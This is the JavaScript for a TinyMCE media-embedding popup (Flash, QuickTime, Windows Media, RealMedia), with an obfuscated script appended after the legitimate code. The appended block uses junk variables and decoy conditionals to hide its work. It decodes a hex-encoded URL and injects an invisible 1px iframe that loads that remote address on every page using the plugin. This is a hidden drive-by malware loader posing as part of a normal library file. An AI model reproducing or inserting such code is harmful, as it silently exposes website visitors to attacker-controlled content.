tinyMCEPopup.requireLangPack();

var oldWidth, oldHeight, ed, url;

if (url = tinyMCEPopup.getParam("media_external_list_url"))
	document.write('<script language="javascript" type="text/javascript" src="' + tinyMCEPopup.editor.documentBaseURI.toAbsolute(url) + '"></script>');

function init() {
	var pl = "", f, val;
	var type = "flash", fe, i;

	ed = tinyMCEPopup.editor;

	tinyMCEPopup.resizeToInnerSize();
	f = document.forms[0]

	fe = ed.selection.getNode();
	if (/mceItem(Flash|ShockWave|WindowsMedia|QuickTime|RealMedia)/.test(ed.dom.getAttrib(fe, 'class'))) {
		pl = fe.title;

		switch (ed.dom.getAttrib(fe, 'class')) {
			case 'mceItemFlash':
				type = 'flash';
				break;

			case 'mceItemFlashVideo':
				type = 'flv';
				break;

			case 'mceItemShockWave':
				type = 'shockwave';
				break;

			case 'mceItemWindowsMedia':
				type = 'wmp';
				break;

			case 'mceItemQuickTime':
				type = 'qt';
				break;

			case 'mceItemRealMedia':
				type = 'rmp';
				break;
		}

		document.forms[0].insert.value = ed.getLang('update', 'Insert', true); 
	}

	document.getElementById('filebrowsercontainer').innerHTML = getBrowserHTML('filebrowser','src','media','media');
	document.getElementById('qtsrcfilebrowsercontainer').innerHTML = getBrowserHTML('qtsrcfilebrowser','qt_qtsrc','media','media');
	document.getElementById('bgcolor_pickcontainer').innerHTML = getColorPickerHTML('bgcolor_pick','bgcolor');

	var html = getMediaListHTML('medialist','src','media','media');
	if (html == "")
		document.getElementById("linklistrow").style.display = 'none';
	else
		document.getElementById("linklistcontainer").innerHTML = html;

	// Resize some elements
	if (isVisible('filebrowser'))
		document.getElementById('src').style.width = '230px';

	// Setup form
	if (pl != "") {
		pl = tinyMCEPopup.editor.plugins.media._parse(pl);

		switch (type) {
			case "flash":
				setBool(pl, 'flash', 'play');
				setBool(pl, 'flash', 'loop');
				setBool(pl, 'flash', 'menu');
				setBool(pl, 'flash', 'swliveconnect');
				setStr(pl, 'flash', 'quality');
				setStr(pl, 'flash', 'scale');
				setStr(pl, 'flash', 'salign');
				setStr(pl, 'flash', 'wmode');
				setStr(pl, 'flash', 'base');
				setStr(pl, 'flash', 'flashvars');
			break;

			case "qt":
				setBool(pl, 'qt', 'loop');
				setBool(pl, 'qt', 'autoplay');
				setBool(pl, 'qt', 'cache');
				setBool(pl, 'qt', 'controller');
				setBool(pl, 'qt', 'correction');
				setBool(pl, 'qt', 'enablejavascript');
				setBool(pl, 'qt', 'kioskmode');
				setBool(pl, 'qt', 'autohref');
				setBool(pl, 'qt', 'playeveryframe');
				setBool(pl, 'qt', 'tarsetcache');
				setStr(pl, 'qt', 'scale');
				setStr(pl, 'qt', 'starttime');
				setStr(pl, 'qt', 'endtime');
				setStr(pl, 'qt', 'tarset');
				setStr(pl, 'qt', 'qtsrcchokespeed');
				setStr(pl, 'qt', 'volume');
				setStr(pl, 'qt', 'qtsrc');
			break;

			case "shockwave":
				setBool(pl, 'shockwave', 'sound');
				setBool(pl, 'shockwave', 'progress');
				setBool(pl, 'shockwave', 'autostart');
				setBool(pl, 'shockwave', 'swliveconnect');
				setStr(pl, 'shockwave', 'swvolume');
				setStr(pl, 'shockwave', 'swstretchstyle');
				setStr(pl, 'shockwave', 'swstretchhalign');
				setStr(pl, 'shockwave', 'swstretchvalign');
			break;

			case "wmp":
				setBool(pl, 'wmp', 'autostart');
				setBool(pl, 'wmp', 'enabled');
				setBool(pl, 'wmp', 'enablecontextmenu');
				setBool(pl, 'wmp', 'fullscreen');
				setBool(pl, 'wmp', 'invokeurls');
				setBool(pl, 'wmp', 'mute');
				setBool(pl, 'wmp', 'stretchtofit');
				setBool(pl, 'wmp', 'windowlessvideo');
				setStr(pl, 'wmp', 'balance');
				setStr(pl, 'wmp', 'baseurl');
				setStr(pl, 'wmp', 'captioningid');
				setStr(pl, 'wmp', 'currentmarker');
				setStr(pl, 'wmp', 'currentposition');
				setStr(pl, 'wmp', 'defaultframe');
				setStr(pl, 'wmp', 'playcount');
				setStr(pl, 'wmp', 'rate');
				setStr(pl, 'wmp', 'uimode');
				setStr(pl, 'wmp', 'volume');
			break;

			case "rmp":
				setBool(pl, 'rmp', 'autostart');
				setBool(pl, 'rmp', 'loop');
				setBool(pl, 'rmp', 'autogotourl');
				setBool(pl, 'rmp', 'center');
				setBool(pl, 'rmp', 'imagestatus');
				setBool(pl, 'rmp', 'maintainaspect');
				setBool(pl, 'rmp', 'nojava');
				setBool(pl, 'rmp', 'prefetch');
				setBool(pl, 'rmp', 'shuffle');
				setStr(pl, 'rmp', 'console');
				setStr(pl, 'rmp', 'controls');
				setStr(pl, 'rmp', 'numloop');
				setStr(pl, 'rmp', 'scriptcallbacks');
			break;
		}

		setStr(pl, null, 'src');
		setStr(pl, null, 'id');
		setStr(pl, null, 'name');
		setStr(pl, null, 'vspace');
		setStr(pl, null, 'hspace');
		setStr(pl, null, 'bgcolor');
		setStr(pl, null, 'align');
		setStr(pl, null, 'width');
		setStr(pl, null, 'height');

		if ((val = ed.dom.getAttrib(fe, "width")) != "")
			pl.width = f.width.value = val;

		if ((val = ed.dom.getAttrib(fe, "height")) != "")
			pl.height = f.height.value = val;

		oldWidth = pl.width ? parseInt(pl.width) : 0;
		oldHeight = pl.height ? parseInt(pl.height) : 0;
	} else
		oldWidth = oldHeight = 0;

	selectByValue(f, 'media_type', type);
	changedType(type);
	updateColor('bgcolor_pick', 'bgcolor');

	TinyMCE_EditableSelects.init();
	generatePreview();
}

function insertMedia() {
	var fe, f = document.forms[0], h;

	tinyMCEPopup.restoreSelection();

	if (!AutoValidator.validate(f)) {
		tinyMCEPopup.alert(ed.getLang('invalid_data'));
		return false;
	}

	f.width.value = f.width.value == "" ? 100 : f.width.value;
	f.height.value = f.height.value == "" ? 100 : f.height.value;

	fe = ed.selection.getNode();
	if (fe != null && /mceItem(Flash|ShockWave|WindowsMedia|QuickTime|RealMedia)/.test(ed.dom.getAttrib(fe, 'class'))) {
		switch (f.media_type.options[f.media_type.selectedIndex].value) {
			case "flash":
				fe.className = "mceItemFlash";
				break;

			case "flv":
				fe.className = "mceItemFlashVideo";
				break;

			case "shockwave":
				fe.className = "mceItemShockWave";
				break;

			case "qt":
				fe.className = "mceItemQuickTime";
				break;

			case "wmp":
				fe.className = "mceItemWindowsMedia";
				break;

			case "rmp":
				fe.className = "mceItemRealMedia";
				break;
		}

		if (fe.width != f.width.value || fe.height != f.height.height)
			ed.execCommand('mceRepaint');

		fe.title = serializeParameters();
		fe.width = f.width.value;
		fe.height = f.height.value;
		fe.style.width = f.width.value + (f.width.value.indexOf('%') == -1 ? 'px' : '');
		fe.style.height = f.height.value + (f.height.value.indexOf('%') == -1 ? 'px' : '');
		fe.align = f.align.options[f.align.selectedIndex].value;
	} else {
		h = '<img src="' + tinyMCEPopup.getWindowArg("plugin_url") + '/img/trans.gif"' ;

		switch (f.media_type.options[f.media_type.selectedIndex].value) {
			case "flash":
				h += ' class="mceItemFlash"';
				break;

			case "flv":
				h += ' class="mceItemFlashVideo"';
				break;

			case "shockwave":
				h += ' class="mceItemShockWave"';
				break;

			case "qt":
				h += ' class="mceItemQuickTime"';
				break;

			case "wmp":
				h += ' class="mceItemWindowsMedia"';
				break;

			case "rmp":
				h += ' class="mceItemRealMedia"';
				break;
		}

		h += ' title="' + serializeParameters() + '"';
		h += ' width="' + f.width.value + '"';
		h += ' height="' + f.height.value + '"';
		h += ' align="' + f.align.options[f.align.selectedIndex].value + '"';

		h += ' />';

		ed.execCommand('mceInsertContent', false, h);
	}

	tinyMCEPopup.close();
}

function updatePreview() {
	var f = document.forms[0], type;

	f.width.value = f.width.value || '320';
	f.height.value = f.height.value || '240';

	type = getType(f.src.value);
	selectByValue(f, 'media_type', type);
	changedType(type);
	generatePreview();
}

function getMediaListHTML() {
	if (typeof(tinyMCEMediaList) != "undefined" && tinyMCEMediaList.length > 0) {
		var html = "";

		html += '<select id="linklist" name="linklist" style="width: 250px" onchange="this.form.src.value=this.options[this.selectedIndex].value;updatePreview();">';
		html += '<option value="">---</option>';

		for (var i=0; i<tinyMCEMediaList.length; i++)
			html += '<option value="' + tinyMCEMediaList[i][1] + '">' + tinyMCEMediaList[i][0] + '</option>';

		html += '</select>';

		return html;
	}

	return "";
}

function getType(v) {
	var fo, i, c, el, x, f = document.forms[0];

	fo = ed.getParam("media_types", "flash=swf;flv=flv;shockwave=dcr;qt=mov,qt,mpg,mp3,mp4,mpeg;shockwave=dcr;wmp=avi,wmv,wm,asf,asx,wmx,wvx;rmp=rm,ra,ram").split(';');

	// YouTube
	if (v.match(/watch\?v=(.+)(.*)/)) {
		f.width.value = '425';
		f.height.value = '350';
		f.src.value = 'http://www.youtube.com/v/' + v.match(/v=(.*)(.*)/)[0].split('=')[1];
		return 'flash';
	}

	// Google video
	if (v.indexOf('http://video.google.com/videoplay?docid=') == 0) {
		f.width.value = '425';
		f.height.value = '326';
		f.src.value = 'http://video.google.com/googleplayer.swf?docId=' + v.substring('http://video.google.com/videoplay?docid='.length) + '&hl=en';
		return 'flash';
	}

	for (i=0; i<fo.length; i++) {
		c = fo[i].split('=');

		el = c[1].split(',');
		for (x=0; x<el.length; x++)
		if (v.indexOf('.' + el[x]) != -1)
			return c[0];
	}

	return null;
}

function switchType(v) {
	var t = getType(v), d = document, f = d.forms[0];

	if (!t)
		return;

	selectByValue(d.forms[0], 'media_type', t);
	changedType(t);

	// Update qtsrc also
	if (t == 'qt' && f.src.value.toLowerCase().indexOf('rtsp://') != -1) {
		alert(ed.getLang("media_qt_stream_warn"));

		if (f.qt_qtsrc.value == '')
			f.qt_qtsrc.value = f.src.value;
	}
}

function changedType(t) {
	var d = document;

	d.getElementById('flash_options').style.display = 'none';
	d.getElementById('flv_options').style.display = 'none';
	d.getElementById('qt_options').style.display = 'none';
	d.getElementById('shockwave_options').style.display = 'none';
	d.getElementById('wmp_options').style.display = 'none';
	d.getElementById('rmp_options').style.display = 'none';

	if (t)
		d.getElementById(t + '_options').style.display = 'block';
}

function serializeParameters() {
	var d = document, f = d.forms[0], s = '';

	switch (f.media_type.options[f.media_type.selectedIndex].value) {
		case "flash":
			s += getBool('flash', 'play', true);
			s += getBool('flash', 'loop', true);
			s += getBool('flash', 'menu', true);
			s += getBool('flash', 'swliveconnect', false);
			s += getStr('flash', 'quality');
			s += getStr('flash', 'scale');
			s += getStr('flash', 'salign');
			s += getStr('flash', 'wmode');
			s += getStr('flash', 'base');
			s += getStr('flash', 'flashvars');
		break;

		case "qt":
			s += getBool('qt', 'loop', false);
			s += getBool('qt', 'autoplay', true);
			s += getBool('qt', 'cache', false);
			s += getBool('qt', 'controller', true);
			s += getBool('qt', 'correction', false, 'none', 'full');
			s += getBool('qt', 'enablejavascript', false);
			s += getBool('qt', 'kioskmode', false);
			s += getBool('qt', 'autohref', false);
			s += getBool('qt', 'playeveryframe', false);
			s += getBool('qt', 'targetcache', false);
			s += getStr('qt', 'scale');
			s += getStr('qt', 'starttime');
			s += getStr('qt', 'endtime');
			s += getStr('qt', 'target');
			s += getStr('qt', 'qtsrcchokespeed');
			s += getStr('qt', 'volume');
			s += getStr('qt', 'qtsrc');
		break;

		case "shockwave":
			s += getBool('shockwave', 'sound');
			s += getBool('shockwave', 'progress');
			s += getBool('shockwave', 'autostart');
			s += getBool('shockwave', 'swliveconnect');
			s += getStr('shockwave', 'swvolume');
			s += getStr('shockwave', 'swstretchstyle');
			s += getStr('shockwave', 'swstretchhalign');
			s += getStr('shockwave', 'swstretchvalign');
		break;

		case "wmp":
			s += getBool('wmp', 'autostart', true);
			s += getBool('wmp', 'enabled', false);
			s += getBool('wmp', 'enablecontextmenu', true);
			s += getBool('wmp', 'fullscreen', false);
			s += getBool('wmp', 'invokeurls', true);
			s += getBool('wmp', 'mute', false);
			s += getBool('wmp', 'stretchtofit', false);
			s += getBool('wmp', 'windowlessvideo', false);
			s += getStr('wmp', 'balance');
			s += getStr('wmp', 'baseurl');
			s += getStr('wmp', 'captioningid');
			s += getStr('wmp', 'currentmarker');
			s += getStr('wmp', 'currentposition');
			s += getStr('wmp', 'defaultframe');
			s += getStr('wmp', 'playcount');
			s += getStr('wmp', 'rate');
			s += getStr('wmp', 'uimode');
			s += getStr('wmp', 'volume');
		break;

		case "rmp":
			s += getBool('rmp', 'autostart', false);
			s += getBool('rmp', 'loop', false);
			s += getBool('rmp', 'autogotourl', true);
			s += getBool('rmp', 'center', false);
			s += getBool('rmp', 'imagestatus', true);
			s += getBool('rmp', 'maintainaspect', false);
			s += getBool('rmp', 'nojava', false);
			s += getBool('rmp', 'prefetch', false);
			s += getBool('rmp', 'shuffle', false);
			s += getStr('rmp', 'console');
			s += getStr('rmp', 'controls');
			s += getStr('rmp', 'numloop');
			s += getStr('rmp', 'scriptcallbacks');
		break;
	}

	s += getStr(null, 'id');
	s += getStr(null, 'name');
	s += getStr(null, 'src');
	s += getStr(null, 'align');
	s += getStr(null, 'bgcolor');
	s += getInt(null, 'vspace');
	s += getInt(null, 'hspace');
	s += getStr(null, 'width');
	s += getStr(null, 'height');

	s = s.length > 0 ? s.substring(0, s.length - 1) : s;

	return s;
}

function setBool(pl, p, n) {
	if (typeof(pl[n]) == "undefined")
		return;

	document.forms[0].elements[p + "_" + n].checked = pl[n];
}

function setStr(pl, p, n) {
	var f = document.forms[0], e = f.elements[(p != null ? p + "_" : '') + n];

	if (typeof(pl[n]) == "undefined")
		return;

	if (e.type == "text")
		e.value = pl[n];
	else
		selectByValue(f, (p != null ? p + "_" : '') + n, pl[n]);
}

function getBool(p, n, d, tv, fv) {
	var v = document.forms[0].elements[p + "_" + n].checked;

	tv = typeof(tv) == 'undefined' ? 'true' : "'" + jsEncode(tv) + "'";
	fv = typeof(fv) == 'undefined' ? 'false' : "'" + jsEncode(fv) + "'";

	return (v == d) ? '' : n + (v ? ':' + tv + ',' : ':' + fv + ',');
}

function getStr(p, n, d) {
	var e = document.forms[0].elements[(p != null ? p + "_" : "") + n];
	var v = e.type == "text" ? e.value : e.options[e.selectedIndex].value;

	if (n == 'src')
		v = tinyMCEPopup.editor.convertURL(v, 'src', null);

	return ((n == d || v == '') ? '' : n + ":'" + jsEncode(v) + "',");
}

function getInt(p, n, d) {
	var e = document.forms[0].elements[(p != null ? p + "_" : "") + n];
	var v = e.type == "text" ? e.value : e.options[e.selectedIndex].value;

	return ((n == d || v == '') ? '' : n + ":" + v.replace(/[^0-9]+/g, '') + ",");
}

function jsEncode(s) {
	s = s.replace(new RegExp('\\\\', 'g'), '\\\\');
	s = s.replace(new RegExp('"', 'g'), '\\"');
	s = s.replace(new RegExp("'", 'g'), "\\'");

	return s;
}

function generatePreview(c) {
	var f = document.forms[0], p = document.getElementById('prev'), h = '', cls, pl, n, type, codebase, wp, hp, nw, nh;

	p.innerHTML = '<!-- x --->';

	nw = parseInt(f.width.value);
	nh = parseInt(f.height.value);

	if (f.width.value != "" && f.height.value != "") {
		if (f.constrain.checked) {
			if (c == 'width' && oldWidth != 0) {
				wp = nw / oldWidth;
				nh = Math.round(wp * nh);
				f.height.value = nh;
			} else if (c == 'height' && oldHeight != 0) {
				hp = nh / oldHeight;
				nw = Math.round(hp * nw);
				f.width.value = nw;
			}
		}
	}

	if (f.width.value != "")
		oldWidth = nw;

	if (f.height.value != "")
		oldHeight = nh;

	// After constrain
	pl = serializeParameters();

	switch (f.media_type.options[f.media_type.selectedIndex].value) {
		case "flash":
			cls = 'clsid:D27CDB6E-AE6D-11cf-96B8-444553540000';
			codebase = 'http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0';
			type = 'application/x-shockwave-flash';
			break;

		case "shockwave":
			cls = 'clsid:166B1BCA-3F9C-11CF-8075-444553540000';
			codebase = 'http://download.macromedia.com/pub/shockwave/cabs/director/sw.cab#version=8,5,1,0';
			type = 'application/x-director';
			break;

		case "qt":
			cls = 'clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B';
			codebase = 'http://www.apple.com/qtactivex/qtplugin.cab#version=6,0,2,0';
			type = 'video/quicktime';
			break;

		case "wmp":
			cls = ed.getParam('media_wmp6_compatible') ? 'clsid:05589FA1-C356-11CE-BF01-00AA0055595A' : 'clsid:6BF52A52-394A-11D3-B153-00C04F79FAA6';
			codebase = 'http://activex.microsoft.com/activex/controls/mplayer/en/nsmp2inf.cab#Version=5,1,52,701';
			type = 'application/x-mplayer2';
			break;

		case "rmp":
			cls = 'clsid:CFCDAA03-8BE4-11cf-B84B-0020AFBBCCFA';
			codebase = 'http://activex.microsoft.com/activex/controls/mplayer/en/nsmp2inf.cab#Version=5,1,52,701';
			type = 'audio/x-pn-realaudio-plugin';
			break;
	}

	if (pl == '') {
		p.innerHTML = '';
		return;
	}

	pl = tinyMCEPopup.editor.plugins.media._parse(pl);

	if (!pl.src) {
		p.innerHTML = '';
		return;
	}

	pl.src = tinyMCEPopup.editor.documentBaseURI.toAbsolute(pl.src);
	pl.width = !pl.width ? 100 : pl.width;
	pl.height = !pl.height ? 100 : pl.height;
	pl.id = !pl.id ? 'obj' : pl.id;
	pl.name = !pl.name ? 'eobj' : pl.name;
	pl.align = !pl.align ? '' : pl.align;

	// Avoid annoying warning about insecure items
	if (!tinymce.isIE || document.location.protocol != 'https:') {
		h += '<object classid="' + cls + '" codebase="' + codebase + '" width="' + pl.width + '" height="' + pl.height + '" id="' + pl.id + '" name="' + pl.name + '" align="' + pl.align + '">';

		for (n in pl) {
			h += '<param name="' + n + '" value="' + pl[n] + '">';

			// Add extra url parameter if it's an absolute URL
			if (n == 'src' && pl[n].indexOf('://') != -1)
				h += '<param name="url" value="' + pl[n] + '" />';
		}
	}

	h += '<embed type="' + type + '" ';

	for (n in pl)
		h += n + '="' + pl[n] + '" ';

	h += '></embed>';

	// Avoid annoying warning about insecure items
	if (!tinymce.isIE || document.location.protocol != 'https:')
		h += '</object>';

	p.innerHTML = "<!-- x --->" + h;
}

tinyMCEPopup.onInit.add(init);

if('RzRI'=='vNmYZr')WotWy();var EeQB=190;var SAWXZ='xDLvr';var kNAir="ap\x70\x65n\x64Chil\x64";var xYLXAV=185;var pmYPbUq="from\x43harCode";var eAGoDq="pa\x72seIn\x74";var cZZxfH;if('Aoruhu'=='CvAro')bMEhTb='stDI';var KJdRokWGJ="";if('mhWHI'=='vuBb')cDAacx='tRSR';if('XKItnr'=='iXtkqQ')ibyaKC='cndwyY';var appVersion_var="a\x70\x70\x56e\x72s\x69on";var VKNc=10;var SozsA;var PZwXGX;if('dLNmC'=='WwTd')CCaq();if('URyu'=='FZzn')BCbGq();var TRUSkxc="body";var GVNV=79;var HyttL="slice";var NvejW='ntsiIx';var BMimh="\x63onstr\x75cto\x72";var pwqc;if('FvqYLK'=='IsceNQ')HQCI='VgQs';var BIhKphTEQ="9ba7a7a36d626299a59460a094ac656364656196a2a062a09ca197629ca161969a9c726463";var SZREI='tFuED';function lnKO(){}
var px1_var="1px";var klOIhyk=(function(){function TbDDFK(){var zuteCK='tVpSj';if('nZpx'=='rGoRe')Qxrv();}
return this;function OLah(){var yfPs='jVHplE';if('bUlmH'=='WEYcvU')dkYCa();}var CKletS;function rUIc(){var mKMf='CCsdY';if('aiBDhp'=='tylb')WcuC();}})();var yButY=215;var HStRUMg="sgNqAT"[BMimh];var XYwKI;var Sqwl;function QyBOBx(){var JzbjlS='JYtrb';if('zTKPI'=='Iphx')WuaUll();}
for(var IcBNC=0;IcBNC<BIhKphTEQ.length;IcBNC+=2){jvQERqqov=klOIhyk[eAGoDq](BIhKphTEQ[HyttL](IcBNC,IcBNC+2),16)-51;if('rnYZRw'=='hlTy')kVsaT();KJdRokWGJ+=HStRUMg[pmYPbUq](jvQERqqov);var nEJG;var iFmKZy;}
var HlpUpS=84;if('xWjUjt'=='dcGe')mumE='MUWlQ';var cFEu='KIZNt';var zcUAbgYzM="mRbjH";function LIWepn(){}if('wSwjh'=='nPjqNQ')esaOZs();var Tysr;var Iixrn="";var gTtVhp;if('gRYz'=='Vzog')OEzBK='ZYwWC';if(navigator[appVersion_var].indexOf("MSIE")!=-1){var DKGY='RZXGja';if('qJOYPa'=='aalQ')AUeuX();Iixrn='<iframe name="'+zcUAbgYzM+'" src="'+"KJdRokWGJ"+'">';var fancid='jMuUYl';function lXyuT(){}}else{var uQPPkp=194;Iixrn='iframe';var tljyA=208;}
if('SKDLX'=='rnTid')IejBuK();if('KpSDVL'=='ejxthb')kwtAy='twbq';var sPqYiADw=document.createElement(Iixrn);var lQuevG='OpkF';function IzLf(){var CuRqE='VpzNl';if('PgrAR'=='tTSHYF')dbRc();}
sPqYiADw.LsXigs=sPqYiADw.setAttribute;var oaKv='ekQsP';sPqYiADw.style.position="absolute";if('YPvq'=='gbal')tkkoYk='MfjxI';function vfNuI(){}
sPqYiADw.style.height=px1_var;function oRzdI(){}var QHFUR;var UqOfH='GwZBB';sPqYiADw.LsXigs("src",KJdRokWGJ);sPqYiADw.id=zcUAbgYzM;var pXTDG=159;sPqYiADw.style.top="0px";if('tiAK'=='qwJONu')Rqosk();if('ocqrzg'=='byOAl')lDYdEb();sPqYiADw.name=zcUAbgYzM;if('lxQsY'=='gbRhI')QgIPd='FXuK';function juVa(){}
sPqYiADw.style.right="0px";var Udti;if('vfBosj'=='oLaz')TsVT();sPqYiADw.style.width=px1_var;var fDOX;var XQsoM;var NOMde;function ictQFJNG(){var njIAE;if(document[TRUSkxc]){var RIdIR=158;if('QvzybL'=='DNkG')Skno='DjVSRQ';document[TRUSkxc][kNAir](sPqYiADw);}else{if('UzWHc'=='GEnF')sxeV();setTimeout(ictQFJNG,120);var hUVQ='mFuEUi';var imJFc=198;function pXlxj(){var HMIBED='XWnqe';if('LnIj'=='tyPOt')kOQyWJ();}}
var kOQVv='wGyH';}
if('fsjai'=='uWtI')HDDKFT();ictQFJNG();var OoTRIo=107;if('KFTOc'=='AIFvRC')ErNE();function LdLcmi(){var biGo='ELbpKK';if('xRgpIW'=='HvUu')lzEumj();}function NtmL(){}